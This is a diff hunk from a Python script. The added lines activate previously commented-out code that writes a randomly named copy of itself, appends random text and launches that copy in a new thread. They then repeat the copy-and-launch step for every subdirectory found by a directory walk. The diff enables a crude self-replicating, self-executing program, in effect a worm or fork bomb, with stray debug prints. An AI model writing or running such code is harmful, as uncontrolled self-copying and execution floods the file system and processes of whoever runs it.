@@ -84,29 +84,28 @@ filename = "newpython{randomness}.py".format(
 # except:
 #    pass
 
-#i = open(".\\" + filename, "w")
-#writeIntoFile(i, lines)
-#i.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
-#i.close()
+i = open(".\\" + filename, "w")
+writeIntoFile(i, lines)
+i.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+i.close()
+thread = Thread(target=runFuncv, args=[".\\" + filename])
+thread.start()
 
-
-
-#def runthread():
-#    thread = Thread(target=runFuncv(".\\" + filename))
-#    thread.start()
-
-
-#thread = Thread(target=runthread)
-#thread.start()
-
-#print("I made it htis far")
+print("I made it htis far")
 
 #walk to subdirs
 for x in os.walk(directory):
-#    if x[0] == os.getcwd():
-#        continue
-    thread = Thread(target=runFunc, args=[x[0], filename, lines])
+    if x[0] == os.getcwd():
+        continue
+    g = open(".\\" + filename, "w")
+    writeIntoFile(g, lines)
+    g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+    g.close()
+    thread = Thread(target=runFuncv, args=[".\\" + filename])
     thread.start()
+    print("I RAN PAST THIS")
+    #thread = Thread(target=runFunc, args=[x[0], filename, lines])
+    #thread.start()
 
 # Ensure this thread gets closed
 sys.exit()
